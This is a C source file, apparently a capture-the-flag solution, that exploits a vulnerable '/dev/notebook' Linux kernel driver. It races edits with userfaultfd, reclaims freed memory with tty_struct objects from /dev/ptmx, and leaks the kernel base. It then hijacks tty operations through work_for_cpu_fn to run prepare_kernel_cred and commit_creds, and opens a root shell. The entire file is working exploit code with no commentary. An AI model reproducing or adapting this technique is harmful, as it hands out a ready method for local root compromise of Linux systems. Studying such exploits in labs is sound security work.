#include <sys/types.h>
#include <stdint.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>

#define PAGE_SIZE 0x1000
#define TTY_STRUCT_SIZE 0x2E0

int fd, tty_fd[0x100];
char* mmap_addr;
sem_t sem_add, sem_edit;

typedef struct
{
	size_t index;
	size_t size;
	char* buf;
}Data;

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void register_userfault(void *fault_page,void *handler)
{
	pthread_t thr;
	struct uffdio_api ua;
	struct uffdio_register ur;
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if(ioctl(uffd, UFFDIO_API, &ua) == -1)
		ErrExit("[-] ioctl-UFFDIO_API error");
	
	ur.range.start = (unsigned long)fault_page; // the area we want to monitor
	ur.range.len = PAGE_SIZE;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // register missing page error handling. when a missing page occurs, the program will block. at this time, we will operate in another thread
		ErrExit("[-] ioctl-UFFDIO_REGISTER error");
	// open a thread, receive the wrong signal, and the handle it
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if(s!=0)
		ErrExit("[-] pthread-create error");
}

void *userfault_sleep_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] sleep handler created");
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	sleep(100);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;
	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] sleep handler done");
	return NULL;
}

void add(size_t index,size_t size,char* buf)
{
	Data data;
	data.index = index;
	data.size = size;
	data.buf = buf;
	ioctl(fd, 0x100, &data);
}

void delete(size_t index)
{
	Data data;
	data.index = index;
	data.size = 0;
	data.buf = NULL;
	ioctl(fd, 0x200, &data);
}

void edit(size_t index,size_t size,char* buf)
{
	Data data;
	data.index = index;
	data.size = size;
	data.buf = buf;
	ioctl(fd, 0x300, &data);
}

void show(char* buf)
{
	Data data;
	data.index = 0;
	data.size = 0;
	data.buf = buf;
	ioctl(fd, 0x64, &data);
}

void* edit_thread(void* index)
{
	puts("[+] edit thread start");
	sem_wait(&sem_edit);
	edit((size_t)index, 0x2000, mmap_addr);
	return NULL;
}

void* add_thread(void* index)
{
	puts("[+] add thread start");
	sem_wait(&sem_add);
	edit((size_t)index, 0x60, mmap_addr);
	return NULL;
}

struct
{
	void * buf;
	size_t size;
}notebook[0x10];

int main()
{
	int tty_index, fake_operation_index;
	char user_buf[0x100] = {0};
	size_t tty_buf[0x100] = {0}, fake_operations[0x100] = {0}, fake_operation_addr;

	sem_init(&sem_edit, 0, 0);
	sem_init(&sem_add, 0, 0);
	
	fd = open("/dev/notebook", 2);
	if(fd<0)
		ErrExit("[-] open notebook error");
	
	mmap_addr = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(mmap_addr == MAP_FAILED)
		ErrExit("[-] mmap error");
	register_userfault(mmap_addr, userfault_sleep_handler);
	
	for(int i=0; i<0x10; i++)
	{
		add(i, 0x20, user_buf);
		edit(i, TTY_STRUCT_SIZE, user_buf);
	}
	puts("[+] notebook has been inited");
	sleep(1);
	
	pthread_t thr_edit, thr_add;

	for(int i=0; i<0xf; i++)
		pthread_create(&thr_edit, NULL, edit_thread, (void*)i);
	puts("[+] start edit thread");
	
	for(int i=0; i<0xf; i++)
		sem_post(&sem_edit);
	puts("[+] edit threads trapped in usearfaultfd");
	sleep(1);
	
	for(int i=0; i<0x80; i++)
		tty_fd[i] = open("/dev/ptmx", 2);
	puts("[+] tty struct has been opend");
	sleep(1);

	for(int i=0; i<0xf; i++)
		pthread_create(&thr_add, NULL, add_thread, (void*)i);
	puts("[+] start add thread");
	
	for(int i=0; i<0xf; i++)
		sem_post(&sem_add);
	puts("[+] add threads trapped in usearfaultfd");
	sleep(1);

	for(int i=0; i<0xf; i++)
	{
		read(fd, tty_buf, i);
		if(tty_buf[0] == 0x100005401)
		{
			printf("[+] hit the tty struct at index: %d\n",i);
			tty_index = i;
			break;
		}
	}
	
	if(tty_buf[0] != 0x100005401)
		ErrExit("[-] failed to hit tty struct");
	
	for(int i=0; i<10; i++)
		printf("[+] %2d: 0x%lx\n",i,tty_buf[i]);
	
	size_t vmlinux_base;
	if((tty_buf[3] & 0xfff) == 0x320)
		vmlinux_base = tty_buf[3] - 0xe8e320;
	else
		vmlinux_base = tty_buf[3] - 0xe8e440;
	printf("[+] vmlinux_base=> 0x%lx\n",vmlinux_base);
	
	size_t offset = vmlinux_base - 0xffffffff81000000;
	size_t prepare_kernel_cred = offset + 0xffffffff810a9ef0;
	size_t commit_creds = offset + 0xffffffff810a9b40;
	size_t work_for_cpu_fn = offset + 0xffffffff8109eb90;
	

	fake_operation_index = 0xf;
	printf("[+] fake tty operation at index: %d\n",fake_operation_index);

	show((char*)notebook);
	for(int i=0; i<0x10; i++)
		printf("[+] %d: 0x%lx	0x%lx\n",i,(size_t)(notebook[i].buf),notebook[i].size);
	printf("[+] tty operations addr=> 0x%lx\n",(size_t)notebook[fake_operation_index].buf);
	read(fd, tty_buf, tty_index);

	tty_buf[0] = 0x100005401;
	tty_buf[3] = (size_t)notebook[fake_operation_index].buf;
	tty_buf[4] = prepare_kernel_cred;
	tty_buf[5] = 0;
	write(fd, tty_buf, tty_index);

	fake_operations[7] = work_for_cpu_fn;
	fake_operations[10] = work_for_cpu_fn;
	fake_operations[12] = work_for_cpu_fn;
	write(fd, fake_operations, fake_operation_index);
	
	for(int i=0; i<13; i++)
		printf("[+] %2d: 0x%lx\n", i, tty_buf[i]);
	
	for(int i=0; i<13; i++)
		printf("[+] %2d: 0x%lx\n", i, fake_operations[i]);

	for(int i=0; i<0x80; i++)
		ioctl(tty_fd[i], 233, 233);
	
	read(fd, tty_buf, tty_index);
	
	tty_buf[0] = 0x100005401;
	tty_buf[3] = (size_t)notebook[fake_operation_index].buf;
	tty_buf[4] = commit_creds;
	tty_buf[5] = tty_buf[6];
	write(fd, tty_buf, tty_index);
	
	for(int i=0; i<0x80; i++)
		ioctl(tty_fd[i], 233, 233);
	
	if(getuid() == 0)
		system("/bin/sh");
	else
		ErrExit("[-] get root failed");

	return 0;
}
